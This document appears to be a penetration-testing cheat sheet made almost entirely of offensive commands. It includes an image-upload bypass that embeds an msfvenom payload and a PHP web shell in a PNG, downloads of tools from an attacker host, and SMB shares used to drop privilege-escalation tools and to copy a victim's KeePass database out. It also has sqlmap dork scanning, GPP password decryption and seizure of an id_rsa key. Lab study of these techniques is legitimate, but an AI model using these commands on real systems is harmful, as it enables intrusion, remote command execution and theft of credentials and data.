# Image upload bypass

Inject payload on image data
```bash
head -n100 real_image.png > payload_image.png
msfvenom -p <payload> LHOST=<kali-ip> LPORT=4444 -f php -o msfvenom_payload.php
cat msfvenom_payload.php >> payload_image.png
```

Inject payload on image metadata
```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' payload_image.png
curl http://website.org/uploads/payload_image.png?cmd=whoami
```

-----------------------

# File transfering via HTTP

Serve File
```bash
python3 -m http.server 80
```

Linux
```bash
wget http://kali-ip/filename
curl http://kali-ip/filename -o filename
```

Windows
```bash
certutil -urlcache -f http://kali-ip/filename filename
iwr -uri http://kali-ip/filename -OutFile filename
(New-Object Net.WebClient).DownloadFile('http://kali-ip/filename', 'filename')
```

-----------------------

# File transfer via SMB

Serve Folder
```bash
impacket-smbserver -ip 192.168.45.177 -smb2support -username sombi -password sombi SombiShare files
```

Connect via powershell
```bash
$pass = convertto-securestring 'sombi' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('sombi', $pass)
New-PSDrive -Name sombi -PSProvider FileSystem -Credential $cred -Root \\192.168.45.245\SombiShare

cd kali:
copy kali:\PrintSpoofer64.exe C:\TEMP
copy kali:\ncat.exe C:\TEMP
copy kali:\SharpHound.exe C:\TEMP
```

Connect via native windows
```bash
net use X: \\192.168.45.172\SombiShare /user:sombi sombi
xcopy C:\Users\milana\Documents\Database.kdbx X:\ /Y
```

-----------------------

# user SMB server within the Windows machine (Native Windows)
```bash
net use X: \\192.168.45.172\SombiShare /user:sombi sombi
xcopy C:\Users\milana\Documents\Database.kdbx X:\ /Y
```

-----------------------

# SQLMAP dorks
```bash
sqlmap -g "inurl:\"php?id=\"" --random-agent -f --batch --answer="extending=N,follow=N,keep=N,exploit=n"
```

-----------------------

# Decrypt Secure string Windows
```bash
<Properties>
...
cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
...
</Properties>

gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

-----------------------

# Take ownership of file on Windows
```bash
takeown /F filename
cacls id_rsa /E /G "Administrators":R
```
-----------------------

# Fix windows path
```bash
echo %path%
C:\Users\tony\AppData\Local\Microsoft\WindowsApps

#let's update the path
set PATH=%PATH%;C:\Windows\System32\;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\wbem\;
```
